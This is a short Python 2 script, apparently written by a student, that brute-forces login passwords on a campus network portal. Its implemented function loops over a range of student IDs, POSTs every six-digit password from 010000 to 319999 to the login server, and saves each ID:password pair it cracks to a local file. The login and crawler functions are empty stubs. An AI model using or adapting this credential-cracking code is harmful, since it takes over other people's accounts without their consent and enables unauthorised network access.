# encoding: UTF-8

import re
import urllib  
import urllib2
import cookielib
from time import clock

#功能：1.自动登录(自动寻找合适帐号) 2.破解 3.爬虫获取空教室等信息


class School_net():
    cookie = cookielib.CookieJar()  
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
    
    def Blast(self):   
        while True:
            start_No = raw_input("[*]Input the start id:")
            end_No   = raw_input("[*]Input the end id:")
            if (int(start_No) < int(end_No)):
                break
            else:
                print "End id must greater than start id"
        
        for stuid in range(int(start_No),int(end_No)):
            str_stuid = "%d" % stuid
            for passwd in range(10000,320000):
                '''    
                if passwd % 300 == 0:
                    f=file("process.txt","a")
                    string = str(passwd/3200.0)+'%' + '    '
                    print string
                    f.write(string)
                    f.close()
                '''
                str_passwd = "%06d" % passwd
                #需要POST的数据#
                postdata=urllib.urlencode({  
                    'DDDDD'     :str_stuid,  
                    'upass'     :str_passwd,
                    '0MKKey'    :'\314\341\275\273'
                    
                })
                #自定义一个请求#
                req = urllib2.Request(  
                    url = 'http://10.3.8.211',
                    data = postdata
                )
        
                #访问该链接#
                result = self.opener.open(req)
        
                #打印返回的内容
                #print result.read()
        
                m = re.search(r'Msg', str(result.read()))
                if not m:
                    string= 'Find password %s:%s \n' % (str_stuid,str_passwd)
                    print string
                    f=file("/root/data/stuaccount/stuaccount.txt","a+")
                    f.write(string)
                    f.close()
                    break
                else:
                    pass

    def Login(sefl):
        pass
    
    def Crawler(self):
        pass
    
    operator = {'1':Blast,'2':Login,'3':Crawler}    
    def intetface(self):
        function = raw_input("[*]Input the number of function?:")
        self.operator.get(function)(self)
    
if __name__ == "__main__": 
    tool = School_net()
    tool.intetface()